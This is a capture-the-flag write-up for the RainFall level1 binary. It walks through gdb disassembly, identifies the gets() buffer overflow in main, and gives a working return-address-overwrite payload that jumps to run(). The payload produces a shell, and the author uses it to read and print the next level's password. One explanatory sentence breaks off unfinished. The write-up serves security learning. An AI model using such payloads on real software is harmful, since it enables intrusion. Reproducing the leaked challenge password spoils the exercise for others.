after tacking a look at the executable assembly code using gdb we could find the following function assembly available using the command `infor funtions`:
```txt
(gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x080482f8  _init
    0x08048340  gets
    0x08048340  gets@plt
    0x08048350  fwrite
    0x08048350  fwrite@plt
    0x08048360  system
    0x08048360  system@plt
    0x08048370  __gmon_start__
    0x08048370  __gmon_start__@plt
    0x08048380  __libc_start_main
    0x08048380  __libc_start_main@plt
    0x08048390  _start
    0x080483c0  __do_global_dtors_aux
    0x08048420  frame_dummy
    0x08048444  run
    0x08048480  main
    0x080484a0  __libc_csu_init
    0x08048510  __libc_csu_fini
    0x08048512  __i686.get_pc_thunk.bx
    0x08048520  __do_global_ctors_aux
    0x0804854c  _fini
```
notice 2 main functions:
- `main` at address `0x08048480`
- `run` at address `0x08048444`
Let's start by analyzing the main function:
```
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
```
The main function takes an input from the user using gets, which is a vulnerable function that can lead to a buffer overflow if the input exceeds the allocated buffer size. 
In this case, the buffer size is 0x50 (80 bytes) due to the instruction `0x08048486 <+6>:     sub    $0x50,%esp`, and the input is stored at 0x10(%esp). The program does not perform any bounds checking on the input, which opened the door for a buffer overflow attack.
Since the executable is not 
```sh
level1@RainFall:~$ (python -c "print 'A'*76 + '\x44\x84\x04\x08'"; cat) | ./level1
Good... Wait what?
pwd
/home/user/level1
cd ../level2
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```